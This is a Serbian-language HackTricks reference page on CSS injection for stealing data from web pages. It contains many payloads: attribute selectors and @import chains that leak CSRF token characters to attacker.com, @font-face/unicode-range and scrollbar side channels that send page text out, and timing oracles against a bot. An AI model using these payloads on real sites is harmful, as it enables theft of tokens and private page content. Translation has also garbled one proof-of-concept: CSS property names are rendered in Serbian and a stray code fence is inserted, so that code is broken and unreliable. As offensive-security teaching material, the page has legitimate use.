# CSS Injection

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Try Hard Security Group**

<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## CSS Injection

### Selektor atributa

CSS selektori su oblikovani da se podudaraju sa vrednostima `name` i `value` atributa `input` elementa. Ako vrednost atributa `value` input elementa počinje sa određenim karakterom, učitava se unapred definisani spoljni resurs:

```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```

Međutim, ovaj pristup ima ograničenje prilikom rukovanja skrivenim input elementima (`type="hidden"`) jer skriveni elementi ne učitavaju pozadine.

#### Bypass za Skrivene Elemente

Da biste zaobišli ovo ograničenje, možete ciljati naredni susedni element koristeći `~` kombinator za opšte susede. Zatim se CSS pravilo primenjuje na sve susede koji slede nakon skrivenog input elementa, što uzrokuje učitavanje pozadinske slike:

```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```

#### Preduslovi za CSS ubacivanje

Da bi tehnika CSS ubacivanja bila efikasna, moraju biti ispunjeni određeni uslovi:

1. **Dužina Payload-a**: Vektor CSS ubacivanja mora podržavati dovoljno dugačke payload-e da bi mogao da smesti oblikovane selektore.
2. **Ponovna evaluacija CSS-a**: Trebalo bi da imate mogućnost da okvirno postavite stranicu, što je neophodno da bi se pokrenula ponovna evaluacija CSS-a sa novim generisanim payload-ima.
3. **Spoljni Resursi**: Tehnika pretpostavlja mogućnost korišćenja slika hostovanih spolja. Ovo može biti ograničeno politikom bezbednosti sadržaja (CSP) sajta.

### Slepi selektor atributa

Kao što je [**objašnjeno u ovom postu**](https://portswigger.net/research/blind-css-exfiltration), moguće je kombinovati selektore **`:has`** i **`:not`** kako bi se identifikovao sadržaj čak i iz slepih elemenata. Ovo je veoma korisno kada nemate pojma šta se nalazi unutar web stranice koja učitava CSS ubacivanje.\
Takođe je moguće koristiti ove selektore kako bi se izvukle informacije iz nekoliko blokova istog tipa kao u:

```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```

Kombinovanjem ove tehnike sa sledećom **@import** tehnikom, moguće je eksfiltrirati mnogo **informacija korišćenjem CSS ubacivanja sa slepih stranica pomoću** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Prethodna tehnika ima neke nedostatke, proverite preduslove. Morate ili biti u mogućnosti da **pošaljete više linkova žrtvi**, ili morate biti u mogućnosti da **ubacite iframe na stranicu ranjivu na CSS ubacivanje**.

Međutim, postoji još jedna pametna tehnika koja koristi **CSS `@import`** da bi poboljšala kvalitet tehnike.

Ovo je prvi put pokazao [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i radi na sledeći način:

Umesto učitavanja iste stranice iznova i iznova sa desetinama različitih payloada svaki put (kao u prethodnoj tehnici), mi ćemo **učitati stranicu samo jednom i samo sa importom ka serveru napadača** (ovo je payload koji treba poslati žrtvi):

```css
@import url('//attacker.com:5001/start?');
```

1. **Uvoz će primiti neki CSS skript** od napadača i **pregledač će ga učitati**.
2. Prvi deo CSS skripta koji će napadač poslati je **još jedan `@import` ka serveru napadača.**
3. Server napadača još neće odgovoriti na ovaj zahtev, jer želimo da procuri neke karaktere, a zatim odgovoriti na ovaj uvoz sa payloadom kako bi procurili sledeće.
4. Drugi i veći deo payloada će biti **payload za curenje atributa selektora**
5. Ovo će poslati serveru napadača **prvi karakter tajne i poslednji**
6. Kada server napadača primi **prvi i poslednji karakter tajne**, odgovoriće na uvoz koji je zatražen u koraku 2.
7. Odgovor će biti tačno isti kao **koraci 2, 3 i 4**, ali ovog puta će pokušati **pronaći drugi karakter tajne, a zatim predposlednji**.

Napadač će **pratiti taj ciklus dok ne uspe potpuno da procuri tajnu**.

Originalni [**Pepe Vila kod za iskorišćavanje ovoga možete pronaći ovde**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ili možete pronaći skoro [**isti kod ali komentiran ovde**.](./#css-injection)

{% hint style="info" %}
Skripta će pokušati otkriti 2 karaktera svaki put (od početka i od kraja) jer atributni selektor omogućava stvari poput:

```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```

Ovo omogućava skriptu da brže otkrije tajnu.
{% endhint %}

{% hint style="warning" %}
Ponekad skript **ne detektuje tačno da je pronađeni prefiks + sufiks već kompletan flag** i nastaviće dalje (u prefiksu) i unazad (u sufiksu) i u nekom trenutku će se zablokirati.\
Nema brige, samo proverite **izlaz** jer **možete videti flag tamo**.
{% endhint %}

### Ostali selektori

Drugi načini pristupa delovima DOM-a pomoću **CSS selektora**:

* **`.class-to-search:nth-child(2)`**: Ovo će pronaći drugu stavku sa klasom "class-to-search" u DOM-u.
* **`:empty`** selektor: Korišćen na primer u [**ovom writeup-u**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search zasnovan na greškama

**Reference:** [CSS bazirani napad: Zloupotreba unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [XS-Search PoC zasnovan na greškama od strane @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Opšti cilj je **koristiti prilagođeni font sa kontrolisane tačke** i osigurati da se **tekst (u ovom slučaju, 'A') prikaže samo ovim fontom ako određeni resurs (`favicon.ico`) ne može da se učita**.

```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```

1. **Korišćenje prilagođenog fonta**:
   * Prilagođeni font se definiše korišćenjem pravila `@font-face` unutar `<style>` oznake u delu `<head>`.
   * Font je nazvan `poc` i preuzima se sa spoljnog endpointa (`http://attacker.com/?leak`).
   * Svojstvo `unicode-range` je postavljeno na `U+0041`, ciljajući specifičan Unicode karakter 'A'.
2. **Element objekta sa rezervnim tekstom**:
   * Element `<object>` sa `id="poc0"` je kreiran u delu `<body>`. Ovaj element pokušava da učita resurs sa adrese `http://192.168.0.1/favicon.ico`.
   * `font-family` za ovaj element je postavljen na `'poc'`, kako je definisano u delu `<style>`.
   * Ako resurs (`favicon.ico`) ne uspe da se učita, rezervisani sadržaj (slovo 'A') unutar `<object>` oznake će biti prikazan.
   * Rezervisani sadržaj ('A') će biti prikazan korišćenjem prilagođenog fonta `poc` ako spoljni resurs ne može da se učita.

### Stilizovanje fragmenta teksta za skrolovanje

**`:target`** pseudo-klasa se koristi za odabir elementa ciljanog putem **URL fragmenta**, kako je navedeno u [specifikaciji CSS selektora nivoa 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Važno je razumeti da `::target-text` ne odgovara nijednom elementu osim ako tekst nije eksplicitno ciljan fragmentom.

Bezbednosna zabrinutost se javlja kada napadači iskorišćavaju mogućnost **Skrolovanja do teksta** fragmenta, omogućavajući im da potvrde prisustvo određenog teksta na veb stranici učitavanjem resursa sa svojeg servera putem HTML ubacivanja. Metoda uključuje ubacivanje CSS pravila poput:

```css
:target::before { content : url(target.png) }
```

U takvim scenarijima, ako je tekst "Administrator" prisutan na stranici, resurs `target.png` se zahteva sa servera, što ukazuje na prisustvo teksta. Primer ovog napada može se izvršiti putem posebno oblikovanog URL-a koji ugrađuje ubačeni CSS zajedno sa fragmentom za skrolovanje do teksta:

```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```

Napad manipuliše HTML ubacivanjem kako bi preneo CSS kod, ciljajući specifičan tekst "Administrator" kroz Scroll-to-text fragment (`#:~:text=Administrator`). Ako se tekst pronađe, naznačeni resurs se učitava, nenamerno signalizirajući svoje prisustvo napadaču.

Za ublažavanje, treba imati na umu sledeće tačke:

1. **Ograničeno podudaranje STTF-a**: Scroll-to-text Fragment (STTF) je dizajniran da se podudara samo sa rečima ili rečenicama, čime se ograničava njegova sposobnost otkrivanja proizvoljnih tajni ili tokena.
2. **Ograničenje na kontekste pregledanja najvišeg nivoa**: STTF funkcioniše isključivo u kontekstima pregledanja najvišeg nivoa i ne funkcioniše unutar iframes-a, čime se svaki pokušaj eksploatacije čini primetnijim korisniku.
3. **Potreba za aktivacijom korisnika**: STTF zahteva gest aktivacije korisnika da bi funkcionisao, što znači da su eksploatacije izvodljive samo putem navigacija koje je inicirao korisnik. Ovaj zahtev značajno umanjuje rizik od automatizovanih napada bez interakcije korisnika. Ipak, autor blog posta ukazuje na specifične uslove i zaobilaze (npr. socijalno inženjerstvo, interakcija sa rasprostranjenim ekstenzijama pregledača) koji mogu olakšati automatizaciju napada.

Svest o ovim mehanizmima i potencijalnim ranjivostima ključna je za održavanje bezbednosti veba i zaštite od takvih eksploatativnih taktika.

Za više informacija pogledajte originalni izveštaj: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Možete proveriti [**eksploit koji koristi ovu tehniku za CTF ovde**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Možete specificirati **spoljne fontove za specifične unicode vrednosti** koje će biti **prikupljene samo ako su te unicode vrednosti prisutne** na stranici. Na primer:

```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```

Kada pristupite ovoj stranici, Chrome i Firefox dohvaćaju "?A" i "?B" jer tekstni čvor sensitive-information sadrži znakove "A" i "B". Međutim, Chrome i Firefox ne dohvaćaju "?C" jer ne sadrži "C". To znači da smo uspeli pročitati "A" i "B".

### Izvlačenje teksta iz čvora (I): ligature <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Opisana tehnika uključuje izvlačenje teksta iz čvora iskorišćavanjem font ligatura i praćenjem promena u širini. Proces uključuje nekoliko koraka:

1. **Kreiranje prilagođenih fontova**:

* SVG fontovi se oblikuju sa glifovima koji imaju atribut `horiz-adv-x`, koji postavlja veliku širinu za glif koji predstavlja sekvencu od dva znaka.
* Primer SVG glifa: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gde "XY" označava sekvencu od dva znaka.
* Ovi fontovi se zatim konvertuju u woff format koristeći fontforge.

2. **Detekcija promena u širini**:

* CSS se koristi kako bi se osiguralo da tekst ne prelazi u novi red (`white-space: nowrap`) i kako bi se prilagodio stil trake za pomeranje.
* Pojava horizontalne trake za pomeranje, stilizovane na poseban način, deluje kao indikator (orakul) da je određena ligatura, a time i određena sekvencija znakova, prisutna u tekstu.
* Uključeni CSS:

```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces eksploatacije**:

* **Korak 1**: Fontovi se kreiraju za parove znakova sa značajnom širinom.
* **Korak 2**: Koristi se trik sa trakom za pomeranje kako bi se detektovalo kada je veliki glif širine (ligatura za par znakova) prikazan, što ukazuje na prisustvo sekvence znakova.
* **Korak 3**: Nakon detekcije ligature, generišu se novi glifovi koji predstavljaju sekvence od tri znaka, uključujući detektovani par i dodajući prethodni ili sledeći znak.
* **Korak 4**: Sprovodi se detekcija troznakovne ligature.
* **Korak 5**: Proces se ponavlja, postepeno otkrivajući ceo tekst.

4. **Optimizacija**:

* Trenutna metoda inicijalizacije korišćenjem `<meta refresh=...` nije optimalna.
* Efikasniji pristup mogao bi uključivati trik sa CSS `@import`, poboljšavajući performanse eksploatacije.

### Izvlačenje teksta iz čvora (II): otkrivanje karakterskog skupa sa podrazumevanim fontom (bez potrebe za spoljnim sredstvima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC korišćenjem Comic Sans od strane @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ovaj trik je objavljen u ovom [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Karakterski skup korišćen u tekstnom čvoru može biti otkriven **korišćenjem podrazumevanih fontova** instaliranih u pregledaču: nisu potrebni spoljni -ili prilagođeni- fontovi.

Koncept se vrti oko korišćenja animacije kako bi se postepeno proširila širina `div`-a, omogućavajući da se po jedan znak prebaci iz 'sufiksa' dela teksta u 'prefiks' deo. Ovaj proces efikasno deli tekst na dva dela:

1. **Prefiks**: Početna linija.
2. **Sufiks**: Naredne linije.

Faze tranzicije karaktera bi izgledale ovako:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Tokom ove tranzicije, **unicode-range trik** se koristi kako bi se identifikovao svaki novi znak dok se pridružuje prefiksu. To se postiže prebacivanjem fonta na Comic Sans, koji je primetno viši od podrazumevanog fonta, što posledično pokreće vertikalnu traku za pomeranje. Pojava ove trake za pomeranje indirektno otkriva prisustvo novog znaka u prefiksu.

Iako ovaj metod omogućava detekciju jedinstvenih znakova kako se pojavljuju, ne precizira koji se znak ponavlja, samo da se ponavljanje desilo.

{% hint style="info" %}
U osnovi, **unicode-range se koristi za otkrivanje znaka**, ali kako ne želimo da učitavamo spoljni font, moramo pronaći drugi način.\
Kada se **znak pronađe**, dodeljuje mu se prethodno instaliran **Comic Sans font**, koji **uvećava** znak i **pokreće traku za pomeranje** koja će **otkriti pronađeni znak**.
{% endhint %}

Proverite kod izdvojen iz PoC-a:

````css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```html
5% { širina: 120px }
6% { širina: 140px }
7% { širina: 0px }
}

div::-webkit-scrollbar {
pozadina: plava;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
pozadina: plava var(--leak);
}
````

### Curenje teksta čvora (III): otkrivanje skupa znakova pomoću podrazumevanog fonta sakrivanjem elemenata (bez potrebe za spoljnim sredstvima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspešno rešenje u ovom tekstu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ovaj slučaj je vrlo sličan prethodnom, međutim, u ovom slučaju cilj pravljenja određenih **znakova većih od drugih je da se nešto sakrije** kao što je dugme koje bot ne bi pritisnuo ili slika koja se ne bi učitala. Tako bismo mogli da merimo radnju (ili nedostatak radnje) i saznamo da li je određeni znak prisutan unutar teksta.

### Curenje teksta čvora (III): otkrivanje skupa znakova pomoću vremena keširanja (bez potrebe za spoljnim sredstvima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspešno rešenje u ovom tekstu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom slučaju, možemo pokušati da otkrijemo da li se znak nalazi u tekstu učitavanjem lažnog fonta sa istog porekla:

```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```

Ako postoji podudaranje, **font će biti učitan sa `/static/bootstrap.min.css?q=1`**. Iako se neće uspešno učitati, **pregledač bi trebalo da ga kešira**, i čak ako nema keša, postoji mehanizam **304 not modified**, tako da bi **odgovor trebao biti brži** od drugih stvari.

Međutim, ako vremenska razlika između keširanog odgovora i nekeširanog nije dovoljno velika, ovo neće biti korisno. Na primer, autor je pomenuo: Međutim, nakon testiranja, otkrio sam da je prvi problem to što brzina nije mnogo drugačija, a drugi problem je što bot koristi zastavicu `disk-cache-size=1`, što je zaista promišljeno.

### Exfiltracija teksta putem čvorova (III): otkrivanje karaktera merenjem vremena učitavanja stotina lokalnih "fontova" (ne zahteva spoljne resurse) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspešno rešenje u ovom izveštaju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom slučaju možete naznačiti **CSS da učita stotine lažnih fontova** sa istog porekla kada se dogodi podudaranje. Na ovaj način možete **meriti vreme** koje je potrebno i saznati da li se karakter pojavljuje ili ne sa nečim poput:

```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```

I kod bota izgleda ovako:

```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```

Dakle, ako se font ne podudara, očekuje se da će vreme odgovora prilikom posete bota biti otprilike 30 sekundi. Međutim, ako postoji podudaranje fonta, biće poslato više zahteva za preuzimanje fonta, što će uzrokovati kontinuiranu aktivnost mreže. Kao rezultat toga, potrebno će više vremena da se ispuni uslov zaustavljanja i primi odgovor. Stoga, vreme odgovora može se koristiti kao indikator za određivanje da li postoji podudaranje fonta.

## Reference

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
